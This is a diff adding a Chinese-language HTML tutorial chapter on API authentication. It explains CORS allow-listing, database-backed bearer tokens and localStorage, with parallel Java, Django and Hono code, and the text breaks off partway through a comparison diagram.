@@ -1,0 +1,1181 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>第 5 章：现代化的基于 Token 的认证 · API 安全实战教程</title>
+<link rel="stylesheet" href="../assets/tutorial.css">
+</head>
+<body>
+<div class="layout">
+  <aside class="sidebar">
+    <a class="brand" href="../index.html">← API 安全实战教程</a>
+    <nav>
+      <a href="#s1">5.1 用 CORS 允许跨域请求</a>
+      <a href="#s2">5.2 不用 Cookie 的 Token</a>
+      <a href="#s3">5.3 加固数据库 Token 存储</a>
+      <a href="#s4">本章小结</a>
+    </nav>
+  </aside>
+  <main>
+    <span class="kicker">第 5 章</span>
+    <h1>现代化的基于 Token 的认证</h1>
+    <p class="subtitle">Cookie 在同域场景下很好用，但一旦客户端换成另一个域名、原生 App、或者移动端，Cookie 就开始处处碰壁——这一章教你把"认证状态"从 Cookie 里搬出来，换成更灵活也更需要你亲手加固的 Bearer Token。</p>
+
+    <p>设想一下：公司市场部新买了一个域名 <code>nat.tr</code>，想把登录页迁移过去，同时又要求老域名的 API 继续可用。你在第 4 章辛辛苦苦做好的 Session Cookie + SameSite + CSRF Token，一下子全部失灵——浏览器的同源策略（Same-Origin Policy, SOP）会直接拦掉跨域请求，Cookie 也不会被跨域的 <code>Set-Cookie</code> 响应头设置进浏览器。这就像你办了一张只能在本市网点使用的银行卡，现在总部要求"外地分行也要能用这张卡"——你需要先去银行谈好"跨行授权"的规则（这就是 CORS），如果还不够灵活，甚至可以换一种完全不依赖银行卡本身的认证方式（比如手机 App 里的动态令牌）——这就是本章要讲的"不用 Cookie 的 Token"。</p>
+
+    <p>本章分三步走：先学会用 CORS（跨域资源共享）合法地打开浏览器的"跨域大门"；再把 Token 从 Cookie 搬到数据库 + <code>Authorization: Bearer</code> 请求头 + 浏览器 Web Storage 的组合里；最后，因为 Token 现在明晃晃地存在数据库里，我们要像第 3 章保护密码一样，对它做哈希，再用 HMAC 加一道"防伪签名"，防止数据库被攻破后被人拿着 Token 为所欲为。</p>
+
+    <h2 id="s1"><span class="num">5.1</span>用 CORS 允许跨域请求</h2>
+
+    <p>先复习一下"源"（origin）的概念：协议 + 主机名 + 端口，三者只要有一个不同，就是不同的源。<code>https://localhost:4567</code> 和 <code>https://localhost:9999</code> 是两个源，即便它们跑在同一台机器上。浏览器的同源策略默认禁止 JavaScript 访问其他源的资源——这本是为了防止恶意网站偷看你在别的网站上的数据，但也意味着你自己的新域名想调用老域名的 API 时，同样会被拦下来。</p>
+
+    <div class="callout note">
+      <div class="title">💡 什么是 CORS</div>
+      <p>CORS（Cross-Origin Resource Sharing，跨源资源共享）是 2013 年推出的标准，让服务器可以显式地告诉浏览器"这个源的这类请求，我允许"。它不是取消同源策略，而是在同源策略的基础上开了一道"白名单闸门"：服务器返回一组特定的响应头，浏览器看到这些头之后才放行。</p>
+    </div>
+
+    <h3>5.1.1 预检请求（Preflight Request）</h3>
+
+    <p>对于那些"有点危险"的跨域请求（比如带自定义头 <code>Authorization</code>，或者 <code>Content-Type: application/json</code> 的 POST 请求），浏览器不会直接把请求发给服务器，而是先发一个"打前站"的请求去问一遍："我这个请求，你到底让不让？"这个打前站的请求就叫预检请求（preflight request），用的是 HTTP 的 <code>OPTIONS</code> 方法。</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 700 420" role="img" aria-label="CORS 预检请求时序图">
+        <defs>
+          <marker id="arrow5" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto">
+            <path d="M0,0 L8,4 L0,8 Z" fill="#5b6478"/>
+          </marker>
+        </defs>
+        <rect x="20" y="14" width="150" height="36" rx="8" fill="#2563eb"/>
+        <text x="95" y="37" text-anchor="middle" fill="#fff" font-size="13" font-weight="600">浏览器（nat.tr 页面）</text>
+        <rect x="520" y="14" width="150" height="36" rx="8" fill="#16a34a"/>
+        <text x="595" y="37" text-anchor="middle" fill="#fff" font-size="13" font-weight="600">Natter API</text>
+
+        <line x1="95" y1="50" x2="95" y2="400" stroke="#e2e5ee" stroke-width="2"/>
+        <line x1="595" y1="50" x2="595" y2="400" stroke="#e2e5ee" stroke-width="2"/>
+
+        <circle cx="95" cy="88" r="10" fill="#d97706"/>
+        <text x="95" y="92" text-anchor="middle" font-size="10" fill="#fff" font-weight="700">1</text>
+        <line x1="105" y1="88" x2="585" y2="88" stroke="#5b6478" stroke-width="1.5" marker-end="url(#arrow5)"/>
+        <text x="345" y="80" text-anchor="middle" font-size="12" fill="#1c2333">OPTIONS /spaces（预检）</text>
+        <text x="345" y="105" text-anchor="middle" font-size="11" fill="#5b6478">Origin: https://nat.tr</text>
+        <text x="345" y="120" text-anchor="middle" font-size="11" fill="#5b6478">Access-Control-Request-Method: POST</text>
+        <text x="345" y="135" text-anchor="middle" font-size="11" fill="#5b6478">Access-Control-Request-Headers: Content-Type, Authorization</text>
+
+        <circle cx="595" cy="165" r="10" fill="#d97706"/>
+        <text x="595" y="169" text-anchor="middle" font-size="10" fill="#fff" font-weight="700">2</text>
+        <text x="345" y="160" text-anchor="middle" font-size="12" fill="#1c2333" font-weight="600">API 检查 Origin 是否在允许名单里</text>
+
+        <circle cx="95" cy="205" r="10" fill="#16a34a"/>
+        <text x="95" y="209" text-anchor="middle" font-size="10" fill="#fff" font-weight="700">3</text>
+        <line x1="585" y1="205" x2="105" y2="205" stroke="#5b6478" stroke-width="1.5" marker-end="url(#arrow5)"/>
+        <text x="345" y="197" text-anchor="middle" font-size="12" fill="#1c2333">204 No Content（允许）</text>
+        <text x="345" y="222" text-anchor="middle" font-size="11" fill="#5b6478">Access-Control-Allow-Origin: https://nat.tr</text>
+        <text x="345" y="237" text-anchor="middle" font-size="11" fill="#5b6478">Access-Control-Allow-Methods: GET, POST, DELETE</text>
+        <text x="345" y="252" text-anchor="middle" font-size="11" fill="#5b6478">Access-Control-Allow-Headers: Content-Type, Authorization</text>
+
+        <circle cx="95" cy="290" r="10" fill="#2563eb"/>
+        <text x="95" y="294" text-anchor="middle" font-size="10" fill="#fff" font-weight="700">4</text>
+        <line x1="105" y1="290" x2="585" y2="290" stroke="#5b6478" stroke-width="1.5" marker-end="url(#arrow5)"/>
+        <text x="345" y="282" text-anchor="middle" font-size="12" fill="#1c2333">浏览器发出真正的请求</text>
+        <text x="345" y="307" text-anchor="middle" font-size="11" fill="#5b6478">POST /spaces  Authorization: Bearer ...</text>
+
+        <circle cx="595" cy="345" r="10" fill="#16a34a"/>
+        <text x="595" y="349" text-anchor="middle" font-size="10" fill="#fff" font-weight="700">5</text>
+        <line x1="585" y1="345" x2="105" y2="345" stroke="#5b6478" stroke-width="1.5" marker-end="url(#arrow5)"/>
+        <text x="345" y="337" text-anchor="middle" font-size="12" fill="#1c2333">201 Created（浏览器把响应交给脚本）</text>
+
+        <rect x="20" y="368" width="650" height="40" rx="8" fill="none" stroke="#dc2626" stroke-width="1.5" stroke-dasharray="4 3"/>
+        <text x="345" y="392" text-anchor="middle" font-size="12" fill="#dc2626">如果第 2 步 Origin 不在允许名单里，API 会直接 halt(403)，浏览器根本不会发出第 4 步的真实请求</text>
+      </svg>
+      <figcaption>图 5-1：浏览器发起跨域 POST 请求时的 CORS 预检时序。只有服务器在预检响应里明确"放行"，浏览器才会发出真正的请求。</figcaption>
+    </figure>
+
+    <div class="callout warn">
+      <div class="title">⚠️ 预检请求必须放在认证之前处理</div>
+      <p>预检请求（OPTIONS）永远不会带上 Cookie、<code>Authorization</code> 等凭证，所以如果你把 CORS 过滤器放在认证过滤器之后，预检请求会先被"未认证"挡下来，浏览器收不到 CORS 响应头，就会认为跨域请求整体被拒绝。正确顺序是：限流 → CORS → 内容类型校验 → 认证。</p>
+    </div>
+
+    <h3>5.1.2 CORS 响应头一览</h3>
+
+    <p>服务器通过一组响应头告诉浏览器"允许什么"：</p>
+
+    <pre class="plain"><code>Access-Control-Allow-Origin: https://nat.tr        允许的源（精确值，或 * 通配符）
+Access-Control-Allow-Credentials: true             是否允许带 Cookie / TLS 客户端证书等凭证
+Access-Control-Allow-Headers: Content-Type, Authorization   预检响应：允许的自定义请求头
+Access-Control-Allow-Methods: GET, POST, DELETE    预检响应：允许的 HTTP 方法
+Access-Control-Max-Age: 86400                      预检响应可以被浏览器缓存多久（秒）
+Access-Control-Expose-Headers: X-My-Header         真实响应：额外暴露给脚本读取的响应头
+Vary: Origin                                       告诉缓存这份响应只对该 Origin 有效</code></pre>
+
+    <div class="callout note">
+      <div class="title">💡 为什么要"回显"Origin 而不是写死一个值</div>
+      <p><code>Access-Control-Allow-Origin</code> 一次只能填一个值（或者通配符 <code>*</code>）。如果你想允许好几个不同的源，就得在服务端维护一份白名单，收到请求后把 <code>Origin</code> 头和白名单做<b>精确字符串比较</b>，命中了才把它原样"回显"回响应头里。这不是 XSS/头注入那种"未经校验就回显"的坏模式——因为比较过程是白名单精确匹配，攻击者伪造的 Origin 根本进不了这个响应。</p>
+    </div>
+
+    <div class="callout danger">
+      <div class="title">🚨 Allow-Credentials 为 true 时不能用通配符</div>
+      <p>如果响应里带了 <code>Access-Control-Allow-Credentials: true</code>（意味着允许带 Cookie），那么 <code>Access-Control-Allow-Origin</code> 就不能是 <code>*</code>，必须是精确的源，否则浏览器会直接拒绝这份响应——因为"任何网站都能带着你的 Cookie 访问 API"是灾难性的。这也是本章最终选择放弃 Cookie、改用 Bearer Token 的动机之一：没有 Cookie，就不需要这条限制，<code>Allow-Origin</code> 甚至可以放开成 <code>*</code>（如果你确实想让任何网站都能调用你的公开 API）。</p>
+    </div>
+
+    <p>下面是 Natter 项目里真实的 <code>CorsFilter</code>：对于允许的源，先加上基础的 CORS 头；如果是预检请求，再补上允许的方法和头，并用 Spark 的 <code>halt()</code> 立即结束请求（预检请求不需要真正执行业务逻辑）。</p>
+
+    <div class="code-compare">
+      <div class="tab-bar">
+        <button class="tab-btn" data-lang="java">Java <span class="fw">· Spark（原书）</span></button>
+        <button class="tab-btn" data-lang="python">Python <span class="fw">· Django</span></button>
+        <button class="tab-btn" data-lang="js">TypeScript <span class="fw">· Hono.js</span></button>
+      </div>
+      <div class="tab-panel" data-lang="java">
+        <div class="file-path">ch05/.../CorsFilter.java</div>
+        <pre><code>class CorsFilter implements Filter {
+    private final Set&lt;String&gt; allowedOrigins;
+
+    CorsFilter(Set&lt;String&gt; allowedOrigins) {
+        this.allowedOrigins = allowedOrigins;
+    }
+
+    @Override
+    public void handle(Request request, Response response) {
+        var origin = request.headers("Origin");
+        if (origin != null &amp;&amp; allowedOrigins.contains(origin)) {
+            response.header("Access-Control-Allow-Origin", origin);
+            response.header("Vary", "Origin");
+        }
+
+        if (isPreflightRequest(request)) {
+            if (origin == null || !allowedOrigins.contains(origin)) {
+                halt(403);
+            }
+            response.header("Access-Control-Allow-Headers",
+                    "Content-Type, Authorization");
+            response.header("Access-Control-Allow-Methods",
+                    "GET, POST, DELETE");
+            halt(204);
+        }
+    }
+
+    private boolean isPreflightRequest(Request request) {
+        return "OPTIONS".equals(request.requestMethod()) &amp;&amp;
+            request.headers().contains("Access-Control-Request-Method");
+    }
+}
+
+// Main.java 里接入（放在限流之后、内容类型校验/认证之前）：
+before(new CorsFilter(Set.of("https://nat.tr")));</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="python">
+        <div class="file-path">settings.py（django-cors-headers）</div>
+        <pre><code># pip install django-cors-headers
+INSTALLED_APPS = [
+    "corsheaders",
+    # ...
+]
+
+MIDDLEWARE = [
+    "corsheaders.middleware.CorsMiddleware",   # 必须排在
+    "django.middleware.common.CommonMiddleware",  # CommonMiddleware 之前
+    # ...其余中间件（认证中间件放在后面）
+]
+
+# 精确白名单，等价于 Java 里的 allowedOrigins 集合
+CORS_ALLOWED_ORIGINS = [
+    "https://nat.tr",
+]
+
+# 只有用 Cookie 做认证时才需要打开；本章后半段改用 Bearer 后可以去掉
+CORS_ALLOW_CREDENTIALS = False
+
+CORS_ALLOW_METHODS = ["GET", "POST", "DELETE", "OPTIONS"]
+CORS_ALLOW_HEADERS = ["content-type", "authorization"]
+
+# django-cors-headers 会自动处理 OPTIONS 预检请求，
+# 并在响应里回显 Origin（当且仅当命中 CORS_ALLOWED_ORIGINS）</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="js">
+        <div class="file-path">src/app.ts（hono/cors）</div>
+        <pre><code>import { Hono } from 'hono'
+import { cors } from 'hono/cors'
+
+const app = new Hono()
+
+// 必须注册在认证中间件之前，
+// 否则预检请求（不带凭证）会先被认证拦下
+app.use('*', cors({
+  origin: ['https://nat.tr'],       // 等价于 Java 的 allowedOrigins 白名单
+  allowMethods: ['GET', 'POST', 'DELETE'],
+  allowHeaders: ['Content-Type', 'Authorization'],
+  credentials: false,               // 改用 Bearer 后不需要带 Cookie
+  maxAge: 600,
+}))
+// hono/cors 会自动响应 OPTIONS 预检请求，
+// 命中 origin 名单时回显 Access-Control-Allow-Origin</code></pre>
+      </div>
+    </div>
+
+    <p>接入到 <code>Main.java</code> 时，顺序很关键——CORS 过滤器要排在限流之后、认证之前：</p>
+
+    <pre class="plain"><code>before((request, response) -> {          // 1. 限流（第 3 章）
+    if (!rateLimiter.tryAcquire()) halt(429);
+});
+before(new CorsFilter(Set.of("https://nat.tr")));   // 2. CORS（本章）
+before(userController::authenticate);                // 3. 认证</code></pre>
+
+    <h2 id="s2"><span class="num">5.2</span>不用 Cookie 的 Token</h2>
+
+    <p>把 CORS 打开之后，你会发现"让 Cookie 跨域工作"本身就很折腾：登录响应要带 <code>Access-Control-Allow-Credentials: true</code>，前端 <code>fetch</code> 要显式传 <code>credentials: 'include'</code>，还不能用 <code>SameSite</code> Cookie（因为 <code>SameSite</code> 和跨站请求本质上是互斥的）。与其和浏览器的隐私策略"死磕"，不如换一条路：彻底不用 Cookie。</p>
+
+    <p>Cookie 之所以好用，其实是打包了三件事：①客户端和服务器之间传递 Token 的标准方式（<code>Cookie</code> / <code>Set-Cookie</code> 头，浏览器自动处理）；②客户端本地存储 Token 的地方（Cookie Jar）；③服务器端保存 Token 状态的存储（框架内置的 Session 存储）。抛弃 Cookie，意味着这三件事都要自己重新实现一遍：</p>
+
+    <ul>
+      <li>服务器端状态 → 自己写一个 <b>DatabaseTokenStore</b>，把 Token 存进数据库；</li>
+      <li>传递方式 → 用标准的 <b><code>Authorization: Bearer &lt;token&gt;</code></b> 请求头；</li>
+      <li>客户端存储 → 用浏览器的 <b>Web Storage</b>（<code>localStorage</code>）。</li>
+    </ul>
+
+    <h3 id="s2-1">5.2.1 把 Token 状态存进数据库</h3>
+
+    <p>Token 的结构很简单：一个 Token ID，加上一组属性（用户名、过期时间等）。Natter 用一张表存放：</p>
+
+    <pre class="plain"><code>CREATE TABLE tokens(
+    token_id   VARCHAR(100) PRIMARY KEY,
+    user_id    VARCHAR(30) NOT NULL,
+    expiry     TIMESTAMP NOT NULL,
+    attributes VARCHAR(4096) NOT NULL   -- 其余属性序列化成 JSON 字符串
+);
+CREATE INDEX expired_token_idx ON tokens(expiry);</code></pre>
+
+    <div class="callout warn">
+      <div class="title">⚠️ Token ID 绝不能用数据库自增序列</div>
+      <p>自增 ID 是可预测的——攻击者猜到一个当前存在的 ID，就能顺着猜别人的 Token，发起会话劫持。Token ID 必须来自密码学安全的随机数生成器（Java 里是 <code>SecureRandom</code>，Linux 上对应 <code>/dev/urandom</code> 或 <code>getrandom(2)</code>），保证足够的"熵"（entropy）——一般建议至少 128 位，长期有效的 Token 建议 160 位以上。Natter 用 20 字节（160 位）随机数，再做 URL-safe Base64 编码得到 Token ID。</p>
+    </div>
+
+    <p>发 Token 时生成随机 ID、把属性序列化成 JSON 存进数据库；校验时按 ID 查表；登出时直接删除对应行。下面是简化版（先不看哈希，哈希是 5.3 节加的）：</p>
+
+    <div class="code-compare">
+      <div class="tab-bar">
+        <button class="tab-btn" data-lang="java">Java <span class="fw">· Spark（原书）</span></button>
+        <button class="tab-btn" data-lang="python">Python <span class="fw">· Django</span></button>
+        <button class="tab-btn" data-lang="js">TypeScript <span class="fw">· Hono.js</span></button>
+      </div>
+      <div class="tab-panel" data-lang="java">
+        <div class="file-path">ch05/.../token/DatabaseTokenStore.java（节选，去掉哈希）</div>
+        <pre><code>public class DatabaseTokenStore implements TokenStore {
+    private final Database database;
+    private final SecureRandom secureRandom = new SecureRandom();
+
+    private String randomId() {
+        var bytes = new byte[20];
+        secureRandom.nextBytes(bytes);
+        return Base64url.encode(bytes);        // 160 位随机 Token ID
+    }
+
+    @Override
+    public String create(Request request, Token token) {
+        var tokenId = randomId();
+        var attrs = new JSONObject(token.attributes).toString();
+        database.updateUnique("INSERT INTO " +
+            "tokens(token_id, user_id, expiry, attributes) " +
+            "VALUES(?, ?, ?, ?)", tokenId, token.username,
+                token.expiry, attrs);
+        return tokenId;
+    }
+
+    @Override
+    public Optional&lt;Token&gt; read(Request request, String tokenId) {
+        return database.findOptional(this::readToken,
+            "SELECT user_id, expiry, attributes " +
+            "FROM tokens WHERE token_id = ?", tokenId);
+    }
+
+    @Override
+    public void revoke(Request request, String tokenId) {
+        database.update(
+            "DELETE FROM tokens WHERE token_id = ?", tokenId);
+    }
+}</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="python">
+        <div class="file-path">tokens/models.py + tokens/store.py</div>
+        <pre><code># tokens/models.py
+import secrets
+from django.db import models
+
+class Token(models.Model):
+    # 等价于 Java 的 token_id：160 位随机值，URL-safe Base64
+    token_id = models.CharField(max_length=100, primary_key=True)
+    user = models.ForeignKey("auth.User", on_delete=models.CASCADE)
+    expiry = models.DateTimeField()
+    attributes = models.JSONField(default=dict)  # 等价 JSON 字符串列
+
+    class Meta:
+        indexes = [models.Index(fields=["expiry"])]
+
+
+# tokens/store.py
+def random_id() -> str:
+    # secrets 模块内部用操作系统的 CSPRNG（等价 SecureRandom）
+    return secrets.token_urlsafe(20)
+
+def create_token(user, expiry, attributes) -> str:
+    token_id = random_id()
+    Token.objects.create(
+        token_id=token_id, user=user,
+        expiry=expiry, attributes=attributes,
+    )
+    return token_id
+
+def read_token(token_id: str) -> Token | None:
+    return Token.objects.filter(token_id=token_id).first()
+
+def revoke_token(token_id: str) -> None:
+    Token.objects.filter(token_id=token_id).delete()</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="js">
+        <div class="file-path">src/tokens/store.ts（drizzle-orm）</div>
+        <pre><code>import { randomBytes } from 'node:crypto'
+import { db } from '../db'
+import { tokens } from '../db/schema'
+import { eq } from 'drizzle-orm'
+
+function randomId(): string {
+  // 20 字节（160 位）CSPRNG 随机数，等价 SecureRandom
+  return randomBytes(20).toString('base64url')
+}
+
+export async function createToken(
+  username: string, expiry: Date, attributes: Record&lt;string, string&gt;
+): Promise&lt;string&gt; {
+  const tokenId = randomId()
+  await db.insert(tokens).values({
+    tokenId, username, expiry, attributes: JSON.stringify(attributes),
+  })
+  return tokenId
+}
+
+export async function readToken(tokenId: string) {
+  const [row] = await db.select().from(tokens)
+    .where(eq(tokens.tokenId, tokenId))
+  return row ?? null
+}
+
+export async function revokeToken(tokenId: string) {
+  await db.delete(tokens).where(eq(tokens.tokenId, tokenId))
+}</code></pre>
+      </div>
+    </div>
+
+    <h3>5.2.2 Bearer 认证方案</h3>
+
+    <p>数据库能存 Token 了，但客户端怎么把它带回来？Natter 最初"临时"复用了第 4 章防 CSRF 用的 <code>X-CSRF-Token</code> 头，这显然不合适——Token 现在跟 CSRF 没关系了。标准做法是 RFC 6750 定义的 <b>Bearer</b> 认证方案：</p>
+
+    <pre class="plain"><code>Authorization: Bearer QDAmQ9TStkDCpVK5A9kFowtYn2k</code></pre>
+
+    <div class="callout note">
+      <div class="title">💡 什么是 Bearer Token</div>
+      <p>"Bearer"字面意思是"持有人"——谁拿着这个 Token，谁就能用它访问 API，不需要再证明别的身份。这既是它的优点（简单、无状态传递、方便第三方临时使用），也是它的风险（一旦泄漏，任何拿到它的人都能冒充你，直到它过期或被撤销）。Bearer 最初是为 OAuth2（第 7 章）设计的，但现在已经是 API Token 认证的事实标准。</p>
+    </div>
+
+    <p>校验逻辑：检查 <code>Authorization</code> 头是否以 <code>"Bearer "</code>（注意有个空格）开头，取后面的部分作为 Token ID；如果没有这个头，就放行给别的认证方式（比如登录接口用的 HTTP Basic）处理。如果 Token 已过期，返回带 <code>WWW-Authenticate</code> 的 401，标准地告诉客户端"该重新登录了"：</p>
+
+    <pre class="plain"><code>HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer realm="users", error="invalid_token",
+        error_description="Token has expired"</code></pre>
+
+    <div class="code-compare">
+      <div class="tab-bar">
+        <button class="tab-btn" data-lang="java">Java <span class="fw">· Spark（原书）</span></button>
+        <button class="tab-btn" data-lang="python">Python <span class="fw">· Django</span></button>
+        <button class="tab-btn" data-lang="js">TypeScript <span class="fw">· Hono.js</span></button>
+      </div>
+      <div class="tab-panel" data-lang="java">
+        <div class="file-path">ch05/.../controller/TokenController.java</div>
+        <pre><code>public JSONObject login(Request request, Response response) {
+    String subject = request.attribute("subject");   // Basic 认证已校验过密码
+    var expiry = now().plus(10, ChronoUnit.MINUTES);
+
+    var token = new TokenStore.Token(expiry, subject);
+    var tokenId = tokenStore.create(request, token);
+
+    response.status(201);
+    return new JSONObject().put("token", tokenId);
+}
+
+public void validateToken(Request request, Response response) {
+    var tokenId = request.headers("Authorization");
+    if (tokenId == null || !tokenId.startsWith("Bearer ")) {
+        return;                       // 不是 Bearer，交给其他认证方式
+    }
+    tokenId = tokenId.substring(7);
+
+    tokenStore.read(request, tokenId).ifPresent(token -> {
+        if (now().isBefore(token.expiry)) {
+            request.attribute("subject", token.username);
+            token.attributes.forEach(request::attribute);
+        } else {
+            response.header("WWW-Authenticate",
+                "Bearer error=\"invalid_token\"," +
+                "error_description=\"Expired\"");
+        }
+    });
+}
+
+public JSONObject logout(Request request, Response response) {
+    var tokenId = request.headers("Authorization");
+    if (tokenId == null || !tokenId.startsWith("Bearer ")) {
+        throw new IllegalArgumentException("missing token header");
+    }
+    tokenId = tokenId.substring(7);
+    tokenStore.revoke(request, tokenId);
+    response.status(200);
+    return new JSONObject();
+}</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="python">
+        <div class="file-path">tokens/authentication.py（DRF 自定义 TokenAuthentication）</div>
+        <pre><code>from datetime import datetime, timezone
+from rest_framework.authentication import BaseAuthentication
+from rest_framework.exceptions import AuthenticationFailed
+from .store import read_token, create_token, revoke_token
+
+class BearerTokenAuthentication(BaseAuthentication):
+    """等价于 Java 的 TokenController.validateToken"""
+
+    def authenticate(self, request):
+        header = request.headers.get("Authorization")
+        if not header or not header.startswith("Bearer "):
+            return None                     # 不是 Bearer，交给其他方式
+        token_id = header[len("Bearer "):]
+
+        token = read_token(token_id)
+        if token is None:
+            return None
+        if token.expiry < datetime.now(timezone.utc):
+            raise AuthenticationFailed(
+                "Token has expired",
+                code="invalid_token",
+            )   # DRF 会把 WWW-Authenticate: Bearer 加到 401 响应
+        return (token.user, token)
+
+
+# views.py —— 登录、登出接口
+class LoginView(APIView):
+    authentication_classes = [BasicAuthentication]  # 用户名密码走 Basic
+
+    def post(self, request):
+        expiry = datetime.now(timezone.utc) + timedelta(minutes=10)
+        token_id = create_token(request.user, expiry, {})
+        return Response({"token": token_id}, status=201)
+
+class LogoutView(APIView):
+    authentication_classes = [BearerTokenAuthentication]
+
+    def delete(self, request):
+        header = request.headers["Authorization"]
+        revoke_token(header[len("Bearer "):])
+        return Response({})</code></pre>
+      </div>
+      <div class="tab-panel" data-lang="js">
+        <div class="file-path">src/middleware/bearerAuth.ts（自定义中间件，基于 hono/bearer-auth 思路）</div>
+        <pre><code>import { Context, Next } from 'hono'
+import { createToken, readToken, revokeToken } from '../tokens/store'
+
+// 等价于 Java 的 TokenController.validateToken，
+// 注册为 app.use('*', bearerAuth) 的 before 过滤器
+export async function bearerAuth(c: Context, next: Next) {
+  const header = c.req.header('Authorization')
+  if (!header || !header.startsWith('Bearer ')) {
+    return next()               // 不是 Bearer，放行给其他认证方式
+  }
+  const tokenId = header.slice('Bearer '.length)
+
+  const token = await readToken(tokenId)
+  if (token && token.expiry > new Date()) {
+    c.set('subject', token.username)
+    for (const [k, v] of Object.entries(token.attributes)) c.set(k, v)
+  } else if (token) {
+    c.header('WWW-Authenticate',
+      'Bearer error="invalid_token", error_description="Expired"')
+  }
+  await next()
+}
+
+// src/routes/sessions.ts
+app.post('/sessions', async (c) => {          // 登录：Basic 校验后签发
+  const subject = c.get('subject') as string
+  const expiry = new Date(Date.now() + 10 * 60 * 1000)
+  const tokenId = await createToken(subject, expiry, {})
+  return c.json({ token: tokenId }, 201)
+})
+
+app.delete('/sessions', async (c) => {         // 登出：撤销 Token
+  const header = c.req.header('Authorization')
+  if (!header?.startsWith('Bearer ')) {
+    return c.json({ error: 'missing token header' }, 400)
+  }
+  await revokeToken(header.slice('Bearer '.length))
+  return c.json({})
+})</code></pre>
+      </div>
+    </div>
+
+    <p>用 <code>curl</code> 试一下（注意登录返回的响应体里已经没有 <code>Set-Cookie</code> 了，Token 直接放在 JSON 里）：</p>
+
+    <pre class="plain"><code>$ curl -i -H 'Content-Type: application/json' -u test:password \
+   -X POST https://localhost:4567/sessions
+HTTP/1.1 201 Created
+Content-Type: application/json
+{"token":"QDAmQ9TStkDCpVK5A9kFowtYn2k"}
+
+$ curl -i -H 'Content-Type: application/json' \
+  -H 'Authorization: Bearer QDAmQ9TStkDCpVK5A9kFowtYn2k' \
+  -d '{"name":"test","owner":"test"}' \
+  https://localhost:4567/spaces
+HTTP/1.1 201 Created</code></pre>
+
+    <h3>5.2.3 删除过期 Token</h3>
+
+    <p>Token 不会自己消失——数据库里的行会一直堆积，既浪费空间，也可能被攻击者利用（反复登录制造大量 Token，撑爆存储，属于一种 DoS）。解决方式很简单：定期跑一条 <code>DELETE</code>：</p>
+
+    <pre class="plain"><code>public void deleteExpiredTokens() {
+    var deleted = database.update(
+        "DELETE FROM tokens WHERE expiry < current_timestamp");
+    logger.info("Deleted {} expired tokens", deleted);
+}
+
+// 构造函数里注册一个每 10 分钟跑一次的定时任务：
+Executors.newSingleThreadScheduledExecutor()
+    .scheduleAtFixedRate(this::deleteExpiredTokens, 10, 10, TimeUnit.MINUTES);</code></pre>
+
+    <p>配合 <code>expiry</code> 列上的索引（<code>CREATE INDEX expired_token_idx ON tokens(expiry)</code>），这条删除语句不需要全表扫描。生产环境里，你可能会用 Django 的 <code>celery beat</code> 定时任务或 Kubernetes <code>CronJob</code>，或者 Node.js 里的 <code>node-cron</code> / 平台自带的定时触发器来替代 Java 的 <code>ScheduledExecutorService</code>——原理是一样的：周期性地跑一条清理语句，并对暴露出来的清理接口加限流或权限校验。</p>
+
+    <h3>5.2.4 把 Token 存进 Web Storage</h3>
+
+    <p>Token 服务端搞定了，客户端呢？浏览器早年除了 Cookie 没有别的持久化选择，HTML5 之后多了两个新工具挂在 <code>window</code> 对象上：</p>
+
+    <ul>
+      <li><code>sessionStorage</code> —— 数据只在当前标签页存活，关闭标签页就没了，标签页之间互不共享；</li>
+      <li><code>localStorage</code> —— 数据持久保存直到显式删除，连浏览器重启都还在，是本章的选择。</li>
+    </ul>
+
+    <p>两者接口一样：<code>setItem(key, value)</code>、<code>getItem(key)</code>、<code>removeItem(key)</code>。相比操作 Cookie 要手写字符串解析，Web Storage 的 API 简单得多：</p>
+
+    <pre class="plain"><code>// 登录成功后保存 Token
+localStorage.setItem('token', json.token);
+
+// 每次请求前取出 Token
+let token = localStorage.getItem('token');
+fetch(apiUrl + '/spaces', {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + token
+    }
+    // 不再需要 credentials: 'include'，因为不依赖浏览器自动带 Cookie
+})</code></pre>
+
+    <p>到这一步，三种"Cookie 提供的能力"就都有了对应的替代品。放在一起对比一下三种存储位置的取舍：</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 720 500" role="img" aria-label="三种 Token 存储位置对比图">
+        <rect x="20" y="20" width="210" height="460" rx="10" fill="#f7f8fb" stroke="#2563eb" stroke-width="1.5"/>
+        <rect x="20" y="20" width="210" height="40" rx="10" fill="#2563eb"/>
+        <text x="125" y="45" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">Cookie（第 4 章）</text>
+
+        <rect x="255" y="20" width="210" height="460" rx="10" fill="#f7f8fb" stroke="#16a34a" stroke-width="1.5"/>
+        <rect x="255" y="20" width="210" height="40" rx="10" fill="#16a34a"/>
+        <text x="360" y="45" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">数据库 + Bearer 头（本章）</text>
+
+        <rect x="490" y="20" width="210" height="460" rx="10" fill="#f7f8fb" stroke="#d97706" stroke-width="1.5"/>
+        <rect x="490" y="20" width="210" height="40" rx="10" fill="#d97706"/>
+        <text x="595" y="45" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">Web Storage 客户端</text>
+
+        <text x="30" y="82" font-size="11.5" fill="#1c2333" font-weight="600">传递方式</text>
+        <text x="30" y="100" font-size="11" fill="#5b6478">浏览器自动附加</text>
+        <text x="30" y="115" font-size="11" fill="#5b6478">Cookie/Set-Cookie 头</text>
+
+        <text x="265" y="82" font-size="11.5" fill="#1c2333" font-weight="600">传递方式</text>
+        <text x="265" y="100" font-size="11" fill="#5b6478">需要客户端手动读取，</text>
+        <text x="265" y="115" font-size="11" fill="#5b6478">放进 Authorization 头</text>
+
+        <text x="500" y="82" font-size="11.5" fill="#1c2333" font-weight="600">存储位置</text>
+        <text x="500" y="100" font-size="11" fill="#5b6478">localStorage /</text>
+        <text x="500" y="115" font-size="11" fill="#5b6478">sessionStorage</text>
+
